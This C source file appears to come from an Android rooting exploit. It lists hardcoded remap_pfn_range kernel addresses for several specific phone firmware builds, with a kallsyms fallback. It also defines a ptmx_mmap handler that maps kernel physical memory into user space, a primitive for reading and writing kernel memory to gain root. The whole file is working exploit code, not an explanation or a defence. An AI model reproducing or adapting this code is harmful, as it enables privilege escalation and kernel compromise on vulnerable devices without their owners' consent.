#include "kallsyms.h"
#include "mm.h"
#include "device_database/device_database.h"

typedef struct _supported_device {
  device_id_t device_id;
  unsigned long int remap_pfn_range_address;
} supported_device;

static supported_device supported_devices[] = {
  { DEVICE_IS17SH_01_00_04,    0xc0208a34 },
  { DEVICE_SH04E_01_00_02,     0xc00e458c },
  { DEVICE_SH04E_01_00_03,     0xc00e46bc },
  { DEVICE_SOL21_9_1_D_0_395,  0xc010e33c },
  { DEVICE_HTL21_JRO03C,       0xc00ff32c },
  { DEVICE_HTL22_JZO54K,       0xc0128b10 },
  { DEVICE_HTX21_JRO03C,       0xc00fa8b0 },
  { DEVICE_N05E_A1000311,      0xc0105800 }
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

unsigned long int
_get_remap_pfn_range_address(void)
{
  int i;
  device_id_t device_id;

  device_id = detect_device();

  for (i = 0; i < n_supported_devices; i++) {
    if (supported_devices[i].device_id == device_id){
      return supported_devices[i].remap_pfn_range_address;
    }
  }

  print_reason_device_not_supported();

  return 0;
}

void *
get_remap_pfn_range_address(void)
{
  if (kallsyms_exist()) {
    return kallsyms_get_symbol_address("remap_pfn_range");
  }
  return (void*)_get_remap_pfn_range_address();
}

static unsigned long int kernel_phys_offset = 0;

void
set_kernel_phys_offset(unsigned long int offset)
{
  kernel_phys_offset = offset;
}

#define PAGE_SHIFT  12

int
ptmx_mmap(struct file *filep, struct vm_area_struct *vma)
{
  return remap_pfn_range(vma, vma->vm_start,
                         kernel_phys_offset >> PAGE_SHIFT,
                         vma->vm_end - vma->vm_start, vma->vm_page_prot);
}

